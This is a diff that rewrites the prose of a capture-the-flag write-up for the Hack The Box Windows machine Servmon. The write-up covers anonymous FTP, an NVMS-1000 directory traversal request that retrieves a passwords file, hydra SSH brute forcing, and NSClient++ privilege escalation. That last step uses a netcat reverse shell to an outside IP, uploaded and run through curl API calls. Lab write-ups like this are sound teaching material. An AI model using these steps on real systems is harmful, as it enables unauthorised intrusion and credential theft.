@@ -6,12 +6,12 @@ points: 20
 rating: 2.2
 date: 2020-04-11
 avatar: assets/htb/servmon.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Servmon
 ---
+
 ## Overview
 
-This was an easy Windows machine....but don't get stuck chasing the rabbits!
+An easy Windows box, though there are plenty of rabbit holes here to waste your time on.
 
 ## Useful Skills and Tools
 
@@ -42,7 +42,7 @@ This was an easy Windows machine....but don't get stuck chasing the rabbits!
 
 ### Nmap scan
 
-First off, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut that tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output to file with a name of `<name>`.
+I kicked things off by running an nmap scan against `<YOUR_IP>`. My go-to flags are `-p-` to cover every TCP port, `-sC` (the same as `--script=default`) to fire off nmap's default enumeration scripts, `-sV` for service/version detection, and `-oN <name>` to write the results to a file named `<name>`.
 
 ```text
 kac0@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon.nmap <YOUR_IP>
@@ -176,11 +176,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 60274.96 seconds
 ```
 
-Lots of open ports on this machine.  There are a number of clues in this output that would tell you that this is a Windows machine such as ports `135 - Microsoft Windows RPC`, `139 - Netbios`, and `445 - Server Message Block (SMB)`.  The FTP client also reports `SYST: Windows_NT` and SSH is running on `OpenSSH for_Windows_7.7`.  With that, it's usually best to start with enumerating the low ports that are well known.  
+This host has a lot of open ports. Several of them point clearly to Windows, like `135 - Microsoft Windows RPC`, `139 - Netbios`, and `445 - Server Message Block (SMB)`. On top of that, the FTP banner shows `SYST: Windows_NT` and SSH reports `OpenSSH for_Windows_7.7`. From here, the sensible move is to begin with the well-known low ports.  
 
 ### Anonymous FTP
 
-If port `21 - FTP` is open, that is usually a good place to start as logging in as `Anonymous` can be an easy way to find useful information. To do this enter `anonymous` when it prompts you for a name, then give an email address when it prompts for a password.  This does not have to be a real address, just in the format `a@b.c`.
+An open `21 - FTP` port is generally worth checking first, since anonymous access often hands over useful data with little effort. Just supply `anonymous` at the name prompt and any email-shaped string at the password prompt. The address need not be valid, only in the form `a@b.c`.
 
 ```text
 kac0@kalimaa:~/htb/servmon$ ftp <YOUR_IP>
@@ -237,7 +237,7 @@ local: Notes to do.txt remote: Notes to do.txt
 ftp>
 ```
 
-Through FTP I was able to find two different users, `Nadine` and `Nathan`.  Each user's folder had a text document in it with some interesting information. 
+FTP revealed two users, `Nadine` and `Nathan`, and each of their folders held a text file with something worth reading. 
 
 ```text
 kac0@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
@@ -248,7 +248,7 @@ kac0@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 5) Place the secret files in SharePoint
 ```
 
-`Nathan`'s folder contained a to-do list that lets us know that there are two services `NVMS` and `NSClient` on this machine, the security of which has not been completely locked down.  It seems as if public access to `NVMS` should still be still available, and whatever "secret files" may still be in an accessible location.
+The to-do list in `Nathan`'s folder tells us the box runs two services, `NVMS` and `NSClient`, neither of which has been fully hardened yet. It also implies that `NVMS` is likely still publicly reachable and that the "secret files" may not yet have been moved somewhere safe.
 
 ```text
 kac0@kalimaa:~/htb/servmon$ cat Confidential.txt 
@@ -261,33 +261,29 @@ Regards
 Nadine
 ```
 
-The file `Confidential.txt` in `Nadine`'s folder gave me some more good news.  She left `Nathan` a file on his desktop that looks to contain passwords.  This may be one of the "secret files" that `Nathan` was planning to lock up in SharePoint that he hadn't gotten to yet. 
+`Nadine`'s `Confidential.txt` brought even better news: she had dropped a passwords file onto `Nathan`'s desktop. That is quite possibly one of the "secret files" `Nathan` still intended to stash away in SharePoint. 
 
 ### HTTP - Port 80 🐇🐇
 
-Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://<YOUR_IP>` redirected to `http://<YOUR_IP>/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  
+Still without a foothold, I turned to HTTP on port 80 next. Hitting `http://<YOUR_IP>` bounced me to `http://<YOUR_IP>/Pages/login.htm`, whose title was `NVMS-1000`. This appears to be the publicly accessible page that `Nathan`'s to-do list referred to.  
 
-![NVMS-1000 Web Portal](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_17-14-29.png)
+![NVMS-1000 Web Portal](assets/wu/servmon/img-1.png)
 
 ### NVMS-1000 Exploit Research
 
-A quick exploit search using `searchsploit nvms 1000` found a directory traversal exploit for this web portal at [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774), and also a Metasploit scanner to check for this vulnerability at [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal).  
+Running `searchsploit nvms 1000` quickly surfaced a directory traversal exploit for this portal at [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774), along with a Metasploit scanner module for the same flaw at [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal).  
 
-{% hint style="info" %}
-_Bypassing the login to this portal is possible, but I'm pretty sure it is a huge rabbit hole that sucked me in for quite awhile._
-{% endhint %}
+_You can bypass the login on this portal, but I'm fairly certain it's a major rabbit hole that ate up a good chunk of my time._
 
 ## Initial Foothold
 
-Can use GET requests and directory traversal to access files on the system.  Blog from Rapid7 shows good way to test for LFI and directory traversal for Windows. since we know the location of the `Passwords.txt` file, use this to exfiltrate
+The flaw lets you read files off the system using GET requests and directory traversal. A Rapid7 blog post outlines a solid approach for testing LFI and directory traversal on Windows, and since we already know where `Passwords.txt` lives, we can use the bug to exfiltrate it.
 
-{% embed url="https://blog.rapid7.com/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/" %}
+I built and tested my requests against the box using Burp Suite's repeater tool.
 
-I used Burp suite's repeater tool to craft my requests and test for this vulnerability on this machine.
+![Checking for LFI through directory traversal](assets/wu/servmon/img-2.png)
 
-![Checking for LFI through directory traversal](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_20-53-48.png)
-
-The machine was indeed vulnerable, and I used the information from the message `Nadine` left for `Nathan` to form my directory traversal GET request.  The server returned a list of seven passwords for me try out.
+The box was in fact vulnerable. Using the hint from `Nadine`'s note to `Nathan`, I crafted a directory traversal GET request, and the server handed back a list of seven passwords to try.
 
 ```text
 GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
@@ -320,7 +316,7 @@ Gr4etN3w5w17hMySk1Pa5$
 
 ## Road to User
 
-Now that I had some credentials, it was time to try to log into the machine with them.  I decided to use the tool`hydra` to do a brute force attack against SSH for both users `Nathan` and `Nadine`.
+With a set of credentials in hand, the next step was to try them against the box. I reached for `hydra` to brute force SSH for both `Nathan` and `Nadine`.
 
 ```text
 kac0@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords <YOUR_IP> ssh
@@ -336,7 +332,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 21:06:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:01
 ```
 
-Thank you `Nadine` for using one of the same passwords you recommended!
+Thanks, `Nadine`, for reusing one of the very passwords you handed out!
 
 ```text
 kac0@kalimaa:~/htb/servmon$ ssh Nadine@<YOUR_IP>
@@ -390,7 +386,7 @@ SeTimeZonePrivilege           Change the time zone                 Enabled
 nadine@SERVMON C:\Users\Nadine>
 ```
 
-After determining the correct password I easily logged in and got a shell as `Nadine`.  
+Once I had the right password, logging in was trivial and gave me a shell as `Nadine`.  
 
 ### user.txt
 
@@ -417,15 +413,15 @@ nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
 
 ### Metagaming - Other user's artifacts
 
-As you can see in this output, there were at least a few different people working on this machine around the same time as me, and that they had left their enumeration scripts behind. On my first couple Hack the Box attempts I found useful information in a public location and thought it was part of the box, only later to find out that I had been receiving spoilers due to other user's artifacts. _Please be courteous to other users in this shared environment and clean up after yourself!_  
+The output above shows that a handful of other players were on this box at the same time as me and had left their enumeration scripts lying around. On my first few Hack the Box attempts I assumed that data found in a public spot was part of the box, only to realize later it was actually a spoiler dropped by another user. _Be considerate of others in this shared environment and tidy up after yourself!_  
 
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as User `Nadine`
 
-I was able to find a PowerShell history file for `Nadine` at `C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, though there was nothing relevant to the challenge..._there were however, lots of attempts to do things \(some quite humorous!\) from other users though!  Unfortunately I accidentally deleted the contents while cleaning up my notes for publishing so you can't enjoy them too._
+I located a PowerShell history file for `Nadine` at `C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, but nothing in it was relevant to the box..._it was, however, full of other users' attempts at various things \(some pretty funny!\). Sadly I wiped the contents by accident while cleaning up my notes for publication, so you won't get to read them._
 
-After browsing through the installed programs I came across something I didn't recognize: `NSClient++`.  
+Looking through the installed software, I spotted one I didn't recognize: `NSClient++`.  
 
 ```text
 nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
@@ -440,7 +436,7 @@ nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
 ...snipped for brevity...
 ```
 
-The changelog didn't really hold any information that seemed useful at first, though it did give me an idea of how long it had been since the program had received an update: 2018-01-18. 
+At first glance the changelog held nothing obviously useful, but it did tell me when the program was last updated: 2018-01-18. 
 
 ```text
 nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
@@ -481,13 +477,13 @@ they will be expanded by scripts placed under the wrapped scripts section. %SCRI
 bat = scripts\\%SCRIPT% %ARGS%
 ```
 
-I found a potential password in the `nsclient.ini` folder, though I wasn't sure what it might go to.  It didn't work for the Administrator account, unfortunately.  Near the bottom of this file were some obvious edits by other users, so I knew this had to be important.  I reset the box to avoid spoiling the rest of it for myself. 
+In `nsclient.ini` I spotted a possible password, though I didn't yet know where it applied. It didn't get me into the Administrator account. Toward the end of the file were some clear modifications made by other users, which told me this file mattered. To keep from spoiling myself further, I reset the box. 
 
 ### NSClient++ Exploit Research
 
-A Google search of `nsclient++ changelog` led to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where I was able to correlate the dates in the `changelog.txt` with the versions of the program's releases.  It looked like the installed program was nightly build version 0.5.2.31 from 2018-01-18. 
+Googling `nsclient++ changelog` brought me to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where I could line up the dates in `changelog.txt` with specific releases. That pointed to the installed copy being nightly build 0.5.2.31 from 2018-01-18. 
 
-Again, a quick `Searchsploit` check found an exploit that might work for this version of `NSClient++`.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
+A quick `Searchsploit` check again turned up an exploit that could apply to this `NSClient++` version. [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
 
 ```text
 Exploit Author: bzyo
@@ -567,7 +563,7 @@ The vulnerability allows local attackers to escalate privileges and execute
 arbitrary code as Local System
 ```
 
-Well this didn't look too awfully complicated.  I now had step-by-step instructions for privilege escalation all the way to `nt authority\system`.  
+This looked fairly straightforward. I now had a step-by-step recipe for escalating all the way up to `nt authority\system`.  
 
 ```text
 nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display 
@@ -575,15 +571,13 @@ nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
 Current password: ew2x6SsGTxjRwXOT
 ```
 
-Running the command in the exploit to get the NSCP web client administrator password gave me the same password that I had seen in the `nsclient.ini` file.  
+Running the exploit's command to retrieve the NSCP web client admin password returned the exact same value I had already seen in `nsclient.ini`.  
 
-Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://<YOUR_IP>:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  _Later I noticed the port was also listed in nsclient.ini, oops._ 
+Going back over my notes, I noticed a port from the original Nmap scan that I hadn't yet investigated. TCP 8443 hosted a site reported as `http-title: NSClient++`. Browsing to `http://<YOUR_IP>:8443` failed, however. Digging a little more, I found a line in `nsclient.ini` that appeared to restrict the web interface to specific hosts, in this case only 127.0.0.1. _I later realized the port was listed in nsclient.ini too, oops._ 
 
 #### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
 
-In order to access this page through the web browser without some sort of remote desktop capability I had to set up port forwarding from my local machine to the remote host.  Since the web portal would only accept traffic from it's own localhost on port 8443, we needed to set up some way to redirect traffic to and from my browser to appear to come from the remote machine.  Luckily this is pretty easy to do with SSH.
-
-{% embed url="https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/" %}
+To reach this page from my browser without any kind of remote desktop, I needed to forward a port from my local machine to the remote host. Because the portal only honored requests coming from its own localhost on port 8443, I had to make my browser's traffic appear to originate on the remote box. SSH makes this quite simple.
 
 `ssh -L 8443:127.0.0.1:8443 Nadine@<YOUR_IP>`
 
@@ -591,13 +585,13 @@ In order to access this page through the web browser without some sort of remote
 
 https://127.0.0.1:8443/index.html\#/
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_22-54-12.png)
+![](assets/wu/servmon/img-3.png)
 
-The web portal seemed somewhat complicated to interact with, and the instructions given in the exploit weren't completely clear how to link to the `evil.bat` script and it's scheduler through the web portal.  After doing lots of reading through the documentation on `nsclient`, I discovered an easier sounding method of interacting with the service.
+The web portal felt awkward to work with, and the exploit's instructions never made it fully clear how to wire up the `evil.bat` script and its scheduler through the UI. After reading a good deal of the `nsclient` documentation, I found what looked like a simpler way to drive the service.
 
 ### Taking the API route
 
-While reading through the API documentation at [https://docs.nsclient.org/api/scripts/](https://docs.nsclient.org/api/scripts/) I thought it sounded like a much easier to deal with route than going through the web portal.  With just two simple commands I could upload my script and execute a query against that script to get it to run. The documentation even gave specifics on how to upload the contents of the script by passing it as a string in the command, rather than actually creating and sending a file.
+The API documentation at [https://docs.nsclient.org/api/scripts/](https://docs.nsclient.org/api/scripts/) struck me as a far easier path than fighting with the web portal. Two short commands were enough to upload my script and then run a query against it to fire it off. The docs even explained how to send the script body inline as a string, instead of building and uploading an actual file.
 
 ```text
 Example¶
@@ -611,14 +605,14 @@ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/che
 Added check_new as scripts\check_new.bat
 ```
 
-For my payload script I still used the one recommended by the exploit author, even though I was sending it to the server by a different method.  It was a very simple netcat reverse shell..
+I stuck with the payload script the exploit author suggested, even though I was delivering it by a different mechanism. It's just a basic netcat reverse shell..
 
 ```text
 #@echo off
 c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
 ```
 
-To send the payload to the server I used `curl` as specified by the documentation and sent the contents of my payload script as `--data-binary "<string>"`.   It prompted me to enter the admin password we had retrieved from the nscp client.  
+Following the documentation, I used `curl` to push the payload to the server, passing the script body as `--data-binary "<string>"`. It then asked for the admin password we had pulled from the nscp client.  
 
 ```text
 nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT \
@@ -629,14 +623,14 @@ nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT \
  Added evil as scripts\evil.bat
 ```
 
-After sending the script it let me know that it had added the script under the name `evil`.  This is the name to use to run a query against it in order to run it.
+Once the script was uploaded, the response confirmed it had been registered under the name `evil`. That's the name you reference in a query to execute it.
 
 ```text
 nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin \
  https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
 ```
 
-At first, I tried executing the script but I didn't receive a reverse shell.  I realized after doing a bit of troubleshooting that I hadn't actually uploaded `nc.exe` to the remote host. My command to transfer the file had not completed successfully, but I had missed the error message it gave in my rush to finish since it was well past my bedtime. _Let this be a lesson to always take your time and pay attention to details, no matter how tired or in a hurry you may be :\)_
+My first execution attempt didn't produce a reverse shell. A bit of troubleshooting revealed I had never actually gotten `nc.exe` onto the remote host. The transfer command had failed, but in my late-night rush to wrap up I had overlooked the error it printed. _Let this be a reminder to slow down and watch the details, however tired or hurried you are :\)_
 
 ```text
 nadine@SERVMON C:\Temp>curl http://10.10.15.20:8090/nc.exe
@@ -664,7 +658,7 @@ nadine@SERVMON C:\Temp>dir
 
 ```
 
-I was not the only to make mistakes while transferring files to this machine.  Another user had tried to upload `nc.exe` \(_I overwrote this_\) and their `evil.bat` to the `C:\Temp` folder but had failed \(_file size of 0 bytes seen above_\).  I figured out that had forgotten to add `--output <file_name>` at first.  Luckily it gave a warning to remind me of this.  
+I wasn't the only one to fumble a file transfer here. Another player had also tried to drop `nc.exe` \(_which I overwrote_\) and their `evil.bat` into `C:\Temp` and failed \(_note the 0-byte size above_\). It turned out I had initially forgotten to append `--output <file_name>`. Thankfully curl warned me about it.  
 
 ```text
 nadine@SERVMON C:\Temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
@@ -674,7 +668,7 @@ Enter host password for user 'admin':
 rf":{}}],"result":3}
 ```
 
-Despite the error message seen above, once I successfully uploaded `nc.exe` to the folder I had specified in my payload `C:\Temp`, and then sent the execute query once again, I received my reverse shell on my host machine.  The error message above I believe is to let an administrator know that there was a long-running script that did not terminate within the specified timeout period.  
+In spite of the error shown above, once `nc.exe` was properly in place in the `C:\Temp` folder named in my payload and I re-sent the execute query, the reverse shell landed back on my host. I believe that error is simply meant to flag for an admin that a script ran long and didn't finish within the configured timeout.  
 
 ### Getting a root shell
 
@@ -742,11 +736,11 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ERROR: Unable to get user claims information.
 ```
 
-Bam!  Now I was logged in as `nt authority\system` and had full control of the system.
+And there it was: a shell as `nt authority\system`, with complete control of the machine.
 
 ### root.txt
 
-The last thing to do was, of course_,_ to collect my proof.  
+All that remained, naturally, was to grab my proof.  
 
 ```text
 C:\Program Files\NSClient++>type C:/Users/Administrator/Desktop/root.txt
@@ -754,7 +748,7 @@ type C:/Users/Administrator/Desktop/root.txt
 The syntax of the command is incorrect.
 ```
 
-_Oops. Apparently in a `cmd.exe` shell the direction of the slash is important when using `type` to read a file!_
+_Oops. It turns out that in a `cmd.exe` shell the slash direction matters when reading a file with `type`!_
 
 ```text
 C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
